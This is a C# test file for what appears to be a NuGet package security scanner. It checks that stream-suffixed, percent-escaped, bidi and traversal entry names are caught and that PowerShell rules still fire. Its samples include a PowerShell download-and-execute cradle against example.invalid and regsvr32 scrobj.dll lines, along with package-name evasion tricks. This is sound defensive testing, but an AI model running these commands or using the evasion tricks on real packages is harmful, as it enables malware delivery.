namespace Silvergun.PackageAnalysis.NuGet.Tests;

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;

using global::NuGet.Packaging;

using Silvergun;
using Silvergun.CodeAnalysis.IL.Tests.Fixture;

using Xunit;

using static EntryAliasingSupport;

/// <summary>
/// <c>docs/agent/tasks/entry-aliasing-coverage.md</c> <b>Review 9</b>, fixed by <b>S10</b> (the ADR 0036 review-9
/// amendment). Measured by the reviewer on both platforms (scratchpad <c>s15a-probe</c> <c>v-*</c> cases and
/// <c>s15-mk.py</c>'s <c>k-*</c> packages), each <c>--strict</c> exit 0 before S10:
/// <list type="bullet">
/// <item><b>C1.</b> <c>build/X.targets%3A%3A%24DATA</c> is NuGet's <c>build/X.targets::$DATA</c>, an NTFS stream name
/// that Windows NuGet writes to the main stream of <c>build\X.targets</c> (a real restore imported it). The extractor
/// wrote a literal <c>%3A</c> file of no kind, which claimed its file and held NuGet's bytes, so it read clean. A RAW
/// <c>':'</c> is renamed by the extractor on Windows (lost already) but written verbatim on Linux, where it read clean.
/// Now any entry whose <c>NuGetName</c> holds a <c>':'</c> is lost on every platform (<c>NuGetPackage.NamesAStream</c>).</item>
/// <item><b>C2.</b> The script language was chosen from the raw on-disk name, so <c>install%2Eps1</c> (and on Linux
/// <c>install.ps1 </c>) lost the PowerShell-only rules BD000101 and BD000900. Now it is chosen from
/// <see cref="NuGetPackage.KindFileName"/>.</item>
/// <item><b>W1.</b> The packaging-anomaly checks judged the raw name only, so <c>%E2%80%AE</c>, a trailing <c>%2E</c>,
/// <c>%2E%2E/</c>, <c>C%3A/</c> or a device name spelt with an escape raised nothing. Now every per-name check except
/// CaseOnlyCollision also judges the unescaped name, reports the RAW name, and says ", as NuGet unescapes it".</item>
/// </list>
///
/// <para>Each C1 package first asserts NuGet's own view (its reader lists the unescaped <c>':'</c> name) and, where the
/// platform writes it, the extractor's (the raw name on disk holding the bytes), so no test passes vacuously. Content is
/// benign: the hook is <see cref="PackageFixture.MaliciousTargets"/> / <see cref="PackageFixture.MaliciousPs1"/>
/// (certutil tokens against <c>malicious.example</c>), the PowerShell samples are the reviewer's (<c>example.invalid</c>,
/// a local <c>regsvr32</c> line), the assembly is the suite's IL fixture. No network.</para>
/// </summary>
public sealed class EntryAliasingStreamNameAndLanguageTests : IClassFixture<StreamNamePackageFixture>
{
    #region Constructors
    public EntryAliasingStreamNameAndLanguageTests(StreamNamePackageFixture fixture) => this.fixture = fixture;
    #endregion

    #region Methods: NamesAStream (unit)
    // NamesAStream is internal (InternalsVisibleTo), like its siblings NuGetName and KindFileName.
    [Theory]
    [InlineData("build/Some.Package.targets", false)]                  // no ':' at all
    [InlineData("build/Some.Package.targets%3A%3A%24DATA", true)]      // escaped, upper-case hex
    [InlineData("build/Some.Package.targets%3a%3a%24data", true)]      // escaped, lower-case hex
    [InlineData("build/Some.Package.targets%3Ax", true)]               // any ':' at all, whatever follows it
    [InlineData("content/a:b.bin", true)]                              // a raw ':'
    [InlineData("build/Some.Package.targets::$DATA", true)]            // a raw stream name
    [InlineData("build/Some.Package.targets%253A", false)]             // unescapes ONCE, to a literal "%3A": no ':'
    [InlineData("lib/portable-net45%2Bwin8/A.dll", false)]             // the corpus's %2B TFMs
    public void NamesAStream_IsTrueExactlyWhenNuGetsNameHoldsAColon(string entry, bool expected)
    {
        Assert.Equal(expected, NamesAStream(entry));
    }

    // The premise of the "%253A" row: NuGet unescapes once, so its name holds "%3A", not ':'.
    [Fact]
    public void NuGetName_ForADoublyEscapedColon_UnescapesOnceToALiteralPercentThreeA()
    {
        Assert.Equal("build/Some.Package.targets%3A", NuGetPackage.NuGetName("build/Some.Package.targets%253A"));
    }
    #endregion

    #region Methods: C1, a ':' in NuGet's name is lost (every platform)
    // v-ads-targets: the hook, alone, under an escaped stream name. The extractor writes the raw name (a file of no kind),
    // which claims its file and holds NuGet's bytes, yet NuGet installs it as build\Some.Package.targets on Windows.
    [Fact]
    public void OpenAndScan_ForALoneEscapedStreamNameTargets_ReportItLost()
    {
        AssertEscapedStreamEntryLost(fixture.SoleAdsTargetsPath, StreamNamePackageFixture.AdsTargets,
            "build/Some.Package.targets::$DATA", PackageItemRole.Build, Encoding.UTF8.GetBytes(PackageFixture.MaliciousTargets));
    }

    // v-ads-lower-targets.
    [Fact]
    public void OpenAndScan_ForALoneLowerCaseEscapedStreamNameTargets_ReportItLost()
    {
        AssertEscapedStreamEntryLost(fixture.SoleAdsTargetsLowerPath, StreamNamePackageFixture.AdsTargetsLower,
            "build/Some.Package.targets::$data", PackageItemRole.Build, Encoding.UTF8.GetBytes(PackageFixture.MaliciousTargets));
    }

    // v-ads-ps1.
    [Fact]
    public void OpenAndScan_ForALoneEscapedStreamNamePs1_ReportItLost()
    {
        AssertEscapedStreamEntryLost(fixture.SoleAdsPs1Path, StreamNamePackageFixture.AdsPs1,
            "tools/install.ps1::$DATA", PackageItemRole.Tools, Encoding.UTF8.GetBytes(PackageFixture.MaliciousPs1));
    }

    // k-dll-ads, with the real IL fixture assembly: never IL-analysed (its kind is none), so the lost row is the disclosure.
    [Fact]
    public void OpenAndScan_ForALoneEscapedStreamNameDll_ReportItLost()
    {
        AssertEscapedStreamEntryLost(fixture.SoleAdsDllPath, StreamNamePackageFixture.AdsDll,
            "lib/net8.0/A.dll::$DATA", PackageItemRole.Lib, fixture.FixtureBytes);
    }

    // v-ads-before-targets: the escaped hook FIRST (what Windows NuGet installs at build\Some.Package.targets, first-wins),
    // then a plain decoy of that name. Both raw names are files of their own; the decoy is the only script scanned and
    // reads clean, so the escaped entry's loss is what makes the package incomplete.
    [Fact]
    public void OpenAndScan_ForAnEscapedStreamNameHookBeforeAPlainDecoy_ReportTheHookLostAndScanTheDecoy()
    {
        var path = fixture.AdsBeforePlainPath;
        using (var reader = new PackageArchiveReader(path))
            Assert.Equal(
                new[] { "build/Some.Package.targets::$DATA", EntryAliasPackageFixture.TargetsEntry },
                reader.GetFiles().Where(f => f.StartsWith("build/", StringComparison.Ordinal)));

        using (var pkg = Open(path))
        {
            Assert.Equal(
                new[] { StreamNamePackageFixture.AdsTargets, EntryAliasPackageFixture.TargetsEntry }.Order(StringComparer.Ordinal),
                BuildFiles(pkg));
            Assert.Equal(PackageFixture.MaliciousTargets, File.ReadAllText(Path.Combine(pkg.ContentRoot, StreamNamePackageFixture.AdsTargets)));
            Assert.Equal([EntryAliasPackageFixture.TargetsEntry], pkg.Scripts.Select(s => s.RelativePath));
            Assert.Equal([StreamNamePackageFixture.AdsTargets], pkg.UninventoriedEntryNames);
        }

        var scan = Scan(path);
        AssertNotInventoriedRows(scan, (StreamNamePackageFixture.AdsTargets, PackageItemRole.Build));
        Assert.Empty(scan.ScriptFindings);   // the decoy is clean: the skip row is the only disclosure
    }

    // v-ads-raw-targets: a RAW stream name. The extractor maps ':' on Windows (so it claimed nothing and was lost already)
    // but writes it verbatim on Linux, where it claimed its file and read clean. Now lost on both.
    [Fact]
    public void OpenAndScan_ForALoneRawStreamNameTargets_ReportItLostOnEveryPlatform()
    {
        using (var pkg = Open(fixture.SoleRawAdsTargetsPath))
        {
            if (OperatingSystem.IsLinux())
                Assert.Equal([StreamNamePackageFixture.RawAdsTargets], BuildFiles(pkg));   // ground truth: verbatim on ext4
            Assert.Equal([StreamNamePackageFixture.RawAdsTargets], pkg.UninventoriedEntryNames);
        }

        AssertNotInventoriedRows(Scan(fixture.SoleRawAdsTargetsPath), (StreamNamePackageFixture.RawAdsTargets, PackageItemRole.Build));
    }

    // A lone raw content/a:b.bin: on Windows written as content/a_b.bin (claims nothing), on Linux verbatim (claims its
    // file). Lost on both now; before S10 it read complete on Linux.
    [Fact]
    public void OpenAndScan_ForALoneRawColonContentEntry_ReportItLostOnEveryPlatform()
    {
        using (var pkg = Open(fixture.SoleRawColonPath))
        {
            Assert.Equal(
                [OperatingSystem.IsWindows() ? EntryAliasPackageFixture.RenameTarget : EntryAliasPackageFixture.ColonAlias],
                ContentFiles(pkg));
            Assert.Equal([EntryAliasPackageFixture.ColonAlias], pkg.UninventoriedEntryNames);
        }

        AssertNotInventoriedRows(Scan(fixture.SoleRawColonPath), (EntryAliasPackageFixture.ColonAlias, PackageItemRole.Content));
    }

    // The controls: escapes that unescape to no ':' (a %2B TFM, a %20, a %2E kind) claim their files and lose nothing.
    [Fact]
    public void Open_ForEscapesThatUnescapeToNoColon_LosesNothing()
    {
        using (var reader = new PackageArchiveReader(fixture.ControlsPath))
            Assert.DoesNotContain(reader.GetFiles(), f => f.Contains(':'));

        using var pkg = Open(fixture.ControlsPath);
        Assert.Equal(StreamNamePackageFixture.ControlEntries.Order(StringComparer.Ordinal), ContentRootFiles(pkg).Where(f => f.Contains('%')));
        Assert.Empty(pkg.UninventoriedEntryNames);
        Assert.Contains(pkg.Scripts, s => s.RelativePath == StreamNamePackageFixture.EscapedDotTargets);
    }

#if WINDOWS
    // The CLI end to end in a child process (net10.0-windows apphost): --strict exits 3 and the caveat names the entry.
    [Fact]
    public void ScanPackageCli_ForALoneEscapedStreamNameTargets_StrictExitsThreeAndNamesIt()
    {
        AssertCliIncompleteNaming(fixture.SoleAdsTargetsPath, StreamNamePackageFixture.AdsTargets);
    }

    [Fact]
    public void ScanPackageCli_ForALoneLowerCaseEscapedStreamNameTargets_StrictExitsThreeAndNamesIt()
    {
        AssertCliIncompleteNaming(fixture.SoleAdsTargetsLowerPath, StreamNamePackageFixture.AdsTargetsLower);
    }

    [Fact]
    public void ScanPackageCli_ForALoneEscapedStreamNamePs1_StrictExitsThreeAndNamesIt()
    {
        AssertCliIncompleteNaming(fixture.SoleAdsPs1Path, StreamNamePackageFixture.AdsPs1);
    }

    [Fact]
    public void ScanPackageCli_ForALoneEscapedStreamNameDll_StrictExitsThreeAndNamesIt()
    {
        AssertCliIncompleteNaming(fixture.SoleAdsDllPath, StreamNamePackageFixture.AdsDll);
    }

    [Fact]
    public void ScanPackageCli_ForAnEscapedStreamNameHookBeforeAPlainDecoy_StrictExitsThreeAndNamesTheHook()
    {
        AssertCliIncompleteNaming(fixture.AdsBeforePlainPath, StreamNamePackageFixture.AdsTargets);
    }

    [Fact]
    public void ScanPackageCli_ForALoneRawColonContentEntry_StrictExitsThreeAndNamesIt()
    {
        AssertCliIncompleteNaming(fixture.SoleRawColonPath, EntryAliasPackageFixture.ColonAlias);
    }
#endif
    #endregion

    #region Methods: KindFileName (unit)
    [Theory]
    [InlineData("tools/install.ps1", "install.ps1")]               // plain
    [InlineData("install.ps1", "install.ps1")]                     // a bare file name, as ScriptRuleScanner passes it
    [InlineData("tools/install%2Eps1", "install.ps1")]             // an escaped dot
    [InlineData("install%2eps1", "install.ps1")]                   // lower-case hex, bare
    [InlineData("tools/Mod%2Epsm1", "Mod.psm1")]
    [InlineData("tools%2Finstall.ps1", "install.ps1")]             // an escaped '/' moves the segment boundary
    [InlineData("x%2Finstall.ps1", "install.ps1")]                 // ... including inside a bare on-disk file name
    [InlineData("tools/install.ps1 ", "install.ps1")]              // a trailing space, kept verbatim on Linux
    [InlineData("tools/install.ps1.", "install.ps1")]              // a trailing dot
    [InlineData("tools/install.ps1%20", "install.ps1")]            // an escaped trailing space
    public void KindFileName_IsTheLastSegmentOfTheUnescapedTrimmedName(string entry, string expected)
    {
        Assert.Equal(expected, NuGetPackage.KindFileName(entry));
    }
    #endregion

    #region Methods: C2, the script language is NuGet's (every platform, and Linux for a trailing space)
    // The premise, so the equality below cannot pass vacuously: under the plain names the three-pattern sample hits both
    // PowerShell-only rules and a language-agnostic one, and the gated sample hits the PowerShell-only BD000900.
    [Theory]
    [InlineData(StreamNamePackageFixture.PlainPs1)]
    [InlineData(StreamNamePackageFixture.PlainPsm1)]
    public void Scan_ForThePlainPowerShellNames_HitsThePowerShellOnlyRules(string plain)
    {
        var three = RuleIds(fixture.ScriptPackage(StreamNamePackageFixture.ThreePattern, plain), plain);
        Assert.Contains("BD000101", three);
        Assert.Contains("BD000900", three);
        Assert.Contains(StreamNamePackageFixture.LanguageAgnosticRule, three);

        Assert.Contains("BD000900", RuleIds(fixture.ScriptPackage(StreamNamePackageFixture.Gated, plain), plain));
    }

    // k-ps-gated-pct / v-psonly-pct / v-psonly-psm1-pct: the escaped name is a script (S9) AND PowerShell (S10).
    [Theory]
    [InlineData(StreamNamePackageFixture.ThreePattern, "tools/install%2Eps1", StreamNamePackageFixture.PlainPs1)]
    [InlineData(StreamNamePackageFixture.ThreePattern, "tools/Mod%2Epsm1", StreamNamePackageFixture.PlainPsm1)]
    [InlineData(StreamNamePackageFixture.Gated, "tools/install%2Eps1", StreamNamePackageFixture.PlainPs1)]
    [InlineData(StreamNamePackageFixture.Gated, "tools/Mod%2Epsm1", StreamNamePackageFixture.PlainPsm1)]
    public void Scan_ForAnEscapedDotPowerShellName_ReportsTheSameFindingsAsThePlainName(string sample, string escaped, string plain)
    {
        AssertSameFindings(sample, escaped, plain);
    }

    // v-psonly-trailsp: ext4 keeps "install.ps1 ", which is NuGet's tools/install.ps1 on Windows. (On Windows the entry is
    // trimmed onto a new file and reported lost, pinned in EntryAliasingCoverageTests' accepted-cost tests.)
    [LinuxExtractionFact("ext4 writes 'tools/install.ps1 ' verbatim, so its language is decided from that raw name")]
    public void Scan_OnLinux_ForATrailingSpacePowerShellName_ReportsTheSameFindingsAsThePlainName()
    {
        AssertSameFindings(StreamNamePackageFixture.ThreePattern, StreamNamePackageFixture.TrailingSpacePs1, StreamNamePackageFixture.PlainPs1);
        AssertSameFindings(StreamNamePackageFixture.Gated, StreamNamePackageFixture.TrailingSpacePs1, StreamNamePackageFixture.PlainPs1);
    }
    #endregion

    #region Methods: W1, name anomalies are also judged as NuGet unescapes the name (unit, every platform)
    [Theory]
    [InlineData("content/invoice%E2%80%AEfdp.exe", PackagingAnomalyCategory.BidiControl,
        "contains bidirectional control character(s) U+202E, as NuGet unescapes it")]
    [InlineData("build/X.targets%2E", PackagingAnomalyCategory.TrailingSpaceOrDot,
        "path segment 'X.targets.' ends with a space or '.', as NuGet unescapes it")]
    [InlineData("%2E%2E/%2E%2E/x.txt", PackagingAnomalyCategory.PathTraversal,
        "entry target escapes the package content root (zip slip), as NuGet unescapes it")]
    [InlineData("C%3A/x.txt", PackagingAnomalyCategory.PathTraversal,
        "drive-qualified entry name (targets an absolute location outside the package), as NuGet unescapes it")]
    [InlineData("%2Fbuild/x.targets", PackagingAnomalyCategory.PathTraversal,
        "rooted (absolute) entry name (targets a location outside the package), as NuGet unescapes it")]
    [InlineData("content/CO%4E.txt", PackagingAnomalyCategory.ReservedDeviceName,
        "path segment 'CON.txt' is the reserved Windows device name CON, as NuGet unescapes it")]
    [InlineData("content/a%0Ab.txt", PackagingAnomalyCategory.ControlCharacter,
        "contains control character(s) U+000A, as NuGet unescapes it")]
    [InlineData("content/a%E2%80%8Bb.txt", PackagingAnomalyCategory.InvisibleCharacter,
        "contains invisible character(s) U+200B, as NuGet unescapes it")]
    public void Analyze_ForAnAnomalyOnlyNuGetsUnescapedNameHas_ReportsItUnderTheRawName(
        string raw, PackagingAnomalyCategory category, string detail)
    {
        var anomaly = Assert.Single(PackageEntryNameAnalyzer.Analyze([raw]));

        Assert.Equal(category, anomaly.Category);
        Assert.Equal(raw, anomaly.EntryName);
        Assert.Equal(detail, anomaly.Detail);
    }

    // Controls: a plain name is judged once (no suffix, no second anomaly from the identical "unescaped" name).
    [Theory]
    [InlineData("content/CON.txt", PackagingAnomalyCategory.ReservedDeviceName,
        "path segment 'CON.txt' is the reserved Windows device name CON")]
    [InlineData("build/X.targets.", PackagingAnomalyCategory.TrailingSpaceOrDot,
        "path segment 'X.targets.' ends with a space or '.'")]
    [InlineData("../x.txt", PackagingAnomalyCategory.PathTraversal,
        "entry target escapes the package content root (zip slip)")]
    public void Analyze_ForAPlainAnomalousName_ReportsItOnceWithNoSuffix(string name, PackagingAnomalyCategory category, string detail)
    {
        var anomaly = Assert.Single(PackageEntryNameAnalyzer.Analyze([name]));

        Assert.Equal(category, anomaly.Category);
        Assert.Equal(name, anomaly.EntryName);
        Assert.Equal(detail, anomaly.Detail);
    }

    // The raw reading wins where it already holds: the device name is judged raw (no suffix), and only the trailing dot,
    // which exists only once unescaped, carries the suffix. One anomaly per category, never two.
    [Fact]
    public void Analyze_ForANameAnomalousBothRawAndUnescaped_JudgesEachCategoryOnceRawFirst()
    {
        const string name = "content/CON.txt%2E";

        var anomalies = PackageEntryNameAnalyzer.Analyze([name]);

        Assert.Equal(
            new[]
            {
                (PackagingAnomalyCategory.TrailingSpaceOrDot, name, "path segment 'CON.txt.' ends with a space or '.', as NuGet unescapes it"),
                (PackagingAnomalyCategory.ReservedDeviceName, name, "path segment 'CON.txt%2E' is the reserved Windows device name CON"),
            },
            anomalies.Select(a => (a.Category, a.EntryName, a.Detail)));
    }

    // Escapes that unescape to an ordinary name raise nothing: the corpus's %2B TFMs, a %20, a %2E kind.
    [Theory]
    [InlineData("lib/portable-net45%2Bwin8/A.dll")]
    [InlineData("content/My%20File.txt")]
    [InlineData("build/Some.Package%2Etargets")]
    public void Analyze_ForAnEscapeThatUnescapesToAnOrdinaryName_ReportsNothing(string name)
    {
        Assert.Empty(PackageEntryNameAnalyzer.Analyze([name]));
    }

    // CaseOnlyCollision stays on the raw names (S10): "A%2Etxt" and "a.txt" are not a raw case-only pair.
    [Fact]
    public void Analyze_ForNamesThatCollideOnlyOnceUnescaped_ReportsNoCaseOnlyCollision()
    {
        Assert.DoesNotContain(PackageEntryNameAnalyzer.Analyze(["content/A%2Etxt", "content/a.txt"]),
            a => a.Category == PackagingAnomalyCategory.CaseOnlyCollision);
    }

    // Wired into the scan: the anomaly reaches the report under the raw declared name.
    [Fact]
    public void Scan_ForAnEscapedBidiOverrideName_ReportsTheBidiAnomalyUnderTheRawName()
    {
        var scan = Scan(fixture.EscapedBidiPath);

        var anomaly = Assert.Single(scan.PackagingAnomalies);
        Assert.Equal(PackagingAnomalyCategory.BidiControl, anomaly.Category);
        Assert.Equal(StreamNamePackageFixture.EscapedBidi, anomaly.EntryName);
        Assert.EndsWith(", as NuGet unescapes it", anomaly.Detail, StringComparison.Ordinal);
    }
    #endregion

    #region Methods: helpers
    private static bool NamesAStream(string entry) => NuGetPackage.NamesAStream(entry);

    // NuGet's reader lists `nugetName` (the ':' name it installs); the extractor wrote `raw` verbatim holding `content`,
    // so the entry claimed its file with NuGet's bytes — and it is lost all the same, with a skip row of `role`, and it
    // is in neither inventory (its kind is none).
    private static void AssertEscapedStreamEntryLost(string nupkgPath, string raw, string nugetName, PackageItemRole role, byte[] content)
    {
        using (var reader = new PackageArchiveReader(nupkgPath))
            Assert.Contains(nugetName, reader.GetFiles());

        using (var pkg = Open(nupkgPath))
        {
            Assert.Equal(content, File.ReadAllBytes(Path.Combine(pkg.ContentRoot, raw)));
            Assert.Equal([raw], pkg.UninventoriedEntryNames);
            Assert.Empty(pkg.Scripts);
            Assert.Empty(pkg.Assemblies);
        }

        var scan = Scan(nupkgPath);
        AssertNotInventoriedRows(scan, (raw, role));
        Assert.DoesNotContain(scan.ScriptFindings, f => f.Source == ScriptFindingSource.Script);
    }

    // The same sample under `name` and under `plain`: the file is analysed (a script, nothing lost, Completed), and its
    // findings equal the plain name's rule for rule.
    private void AssertSameFindings(string sample, string name, string plain)
    {
        var expected = Findings(fixture.ScriptPackage(sample, plain), plain);
        Assert.NotEmpty(expected);

        Assert.Equal(expected, Findings(fixture.ScriptPackage(sample, name), name));
    }

    private static (string RuleId, int StartLine, int Occurrences)[] Findings(string nupkgPath, string entry)
    {
        using (var pkg = Open(nupkgPath))
        {
            Assert.Contains(pkg.Scripts, s => s.RelativePath == entry);
            Assert.Empty(pkg.UninventoriedEntryNames);
        }

        var scan = Scan(nupkgPath);
        Assert.Equal(ScriptScanStatus.Completed, scan.ScriptScanStatus);
        return scan.ScriptFindings
            .Where(f => f.RelativePath == entry && f.Source == ScriptFindingSource.Script)
            .Select(f => (f.RuleId, f.StartLine, f.Occurrences))
            .Order()
            .ToArray();
    }

    private static string[] RuleIds(string nupkgPath, string entry) => Findings(nupkgPath, entry).Select(f => f.RuleId).ToArray();
    #endregion

    #region Fields
    private readonly StreamNamePackageFixture fixture;
    #endregion
}

/// <summary>
/// Stages review 9's probe shapes (<c>s15a-probe\Program.cs</c> <c>v-*</c>, <c>s15-mk.py</c> <c>k-*</c>) for
/// <see cref="EntryAliasingStreamNameAndLanguageTests"/> with pure BCL zip (raw names stored verbatim by
/// <see cref="NupkgBuilder"/>). The probes' webhook hook is replaced by the suite's benign fixtures and the
/// <c>MZ-not-really</c> bytes by the real IL fixture assembly; the PowerShell samples are the reviewer's own.
/// </summary>
public sealed class StreamNamePackageFixture : IDisposable
{
    #region Constructors
    public StreamNamePackageFixture()
    {
        Runtime.Initialize("Silvergun", "TESTS");

        rootDir = Path.Combine(Path.GetTempPath(), "silvergun-entry-alias", "stream-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(rootDir);

        var hook = Text(PackageFixture.MaliciousTargets);
        var decoy = Text(EntryAliasPackageFixture.DecoyTargets);
        FixtureBytes = File.ReadAllBytes(typeof(Shapes).Assembly.Location);

        SoleAdsTargetsPath = Write("SoleAdsTargets", [(AdsTargets, hook)]);
        SoleAdsTargetsLowerPath = Write("SoleAdsTargetsLower", [(AdsTargetsLower, hook)]);
        SoleAdsPs1Path = Write("SoleAdsPs1", [(AdsPs1, Text(PackageFixture.MaliciousPs1))]);
        SoleAdsDllPath = Write("SoleAdsDll", [(AdsDll, FixtureBytes)]);
        AdsBeforePlainPath = Write("AdsBeforePlain", [(AdsTargets, hook), (EntryAliasPackageFixture.TargetsEntry, decoy)]);
        SoleRawAdsTargetsPath = Write("SoleRawAdsTargets", [(RawAdsTargets, hook)]);
        SoleRawColonPath = Write("SoleRawColon", [(EntryAliasPackageFixture.ColonAlias, Text("hello\n"))]);
        ControlsPath = Write("Controls", ControlEntries.Select(e => (e, e == EscapedDotTargets ? decoy : Text("hello\n"))).ToArray());
        EscapedBidiPath = Write("EscapedBidi", [(EscapedBidi, Text("MZ"))]);

        var samples = new Dictionary<string, byte[]> { [ThreePattern] = Text(ThreePatternScript), [Gated] = Text(GatedScript) };
        var names = new[] { PlainPs1, PlainPsm1, "tools/install%2Eps1", "tools/Mod%2Epsm1", TrailingSpacePs1 };
        scriptPackages = samples
            .SelectMany(s => names.Select(n => (Key: (s.Key, n), Path: Write($"{s.Key}-{names.ToList().IndexOf(n)}", [(n, s.Value)]))))
            .ToDictionary(x => x.Key, x => x.Path);
    }
    #endregion

    #region Properties
    /// <summary>NuGet's <c>build/Some.Package.targets::$DATA</c>: on Windows, the main stream of the plain targets file.</summary>
    public const string AdsTargets = "build/Some.Package.targets%3A%3A%24DATA";

    /// <summary>The same, lower-case hex: NuGet's <c>build/Some.Package.targets::$data</c>.</summary>
    public const string AdsTargetsLower = "build/Some.Package.targets%3a%3a%24data";

    /// <summary>NuGet's <c>tools/install.ps1::$DATA</c>.</summary>
    public const string AdsPs1 = "tools/install.ps1%3A%3A%24DATA";

    /// <summary>NuGet's <c>lib/net8.0/A.dll::$DATA</c>.</summary>
    public const string AdsDll = "lib/net8.0/A.dll%3A%3A%24DATA";

    /// <summary>A raw stream name, not escaped.</summary>
    public const string RawAdsTargets = "build/Some.Package.targets::$DATA";

    /// <summary>A %2E-named targets file: NuGet's <c>build/Some.Package.targets</c>, a script (S9).</summary>
    public const string EscapedDotTargets = "build/Some.Package%2Etargets";

    /// <summary>NuGet's <c>content/invoice&lt;U+202E&gt;fdp.exe</c>, spelt in ASCII.</summary>
    public const string EscapedBidi = "content/invoice%E2%80%AEfdp.exe";

    /// <summary>The plain PowerShell names the escaped ones are compared against.</summary>
    public const string PlainPs1 = "tools/install.ps1";
    public const string PlainPsm1 = "tools/Mod.psm1";

    /// <summary>A trailing space, which ext4 keeps (Windows trims it, and the entry is lost there).</summary>
    public const string TrailingSpacePs1 = "tools/install.ps1 ";

    /// <summary>Sample keys for <see cref="ScriptPackage"/>.</summary>
    public const string ThreePattern = "Three";
    public const string Gated = "Gated";

    /// <summary>The language-agnostic rule the three-pattern sample also hits (LOLBAS, no <c>applies_to</c>).</summary>
    public const string LanguageAgnosticRule = "BD000600";

    /// <summary>The reviewer's v-psonly sample: BD000101 and BD000900 (both PowerShell-only) plus a language-agnostic hit.</summary>
    public const string ThreePatternScript =
        "$c = New-Object Net.WebClient\niex $c.DownloadString('https://example.invalid/a')\nregsvr32 /s x.dll\n";

    /// <summary>The reviewer's k-ps-gated sample: a PowerShell-only BD000900 hit.</summary>
    public const string GatedScript = "regsvr32 /s /n /i:x scrobj.dll\n";

    /// <summary>Escapes that unescape to no ':' — a %2B TFM, a %20, a %2E kind — each its own file.</summary>
    public static readonly string[] ControlEntries = ["lib/portable-net45%2Bwin8/readme.txt", "content/My%20File.txt", EscapedDotTargets];

    public string SoleAdsTargetsPath { get; }
    public string SoleAdsTargetsLowerPath { get; }
    public string SoleAdsPs1Path { get; }
    public string SoleAdsDllPath { get; }
    public string AdsBeforePlainPath { get; }
    public string SoleRawAdsTargetsPath { get; }
    public string SoleRawColonPath { get; }
    public string ControlsPath { get; }
    public string EscapedBidiPath { get; }

    /// <summary>The IL fixture assembly's bytes (<see cref="Shapes"/>'s assembly).</summary>
    public byte[] FixtureBytes { get; }
    #endregion

    #region Methods
    public void Dispose()
    {
        try
        {
            if (Directory.Exists(rootDir)) Directory.Delete(rootDir, recursive: true);
        }
        catch (Exception ex) when (ex is IOException or UnauthorizedAccessException) { /* best-effort temp cleanup */ }
    }

    /// <summary>The package holding the manifest and <paramref name="sample"/>'s script under <paramref name="name"/>.</summary>
    public string ScriptPackage(string sample, string name) => scriptPackages[(sample, name)];

    private static byte[] Text(string s) => Encoding.UTF8.GetBytes(s);

    // The manifest first, then the entries in the given archive order (the order is the point in the before/after pair).
    private string Write(string name, (string Name, byte[] Bytes)[] entries)
    {
        var path = Path.Combine(rootDir, $"{name}.1.0.0.nupkg");
        NupkgBuilder.WriteNupkg(path, [], [(Manifest, nuspec), .. entries]);
        return path;
    }
    #endregion

    #region Fields
    private const string Manifest = "PkgStream.nuspec";

    private static readonly byte[] nuspec = Encoding.UTF8.GetBytes(NupkgBuilder.NuspecXml(
        "PkgStream", "1.0.0", "Silvergun Tests", "Stream-name and script-language test package.", "net8.0", []));

    private readonly string rootDir;
    private readonly Dictionary<(string Sample, string Name), string> scriptPackages;
    #endregion
}
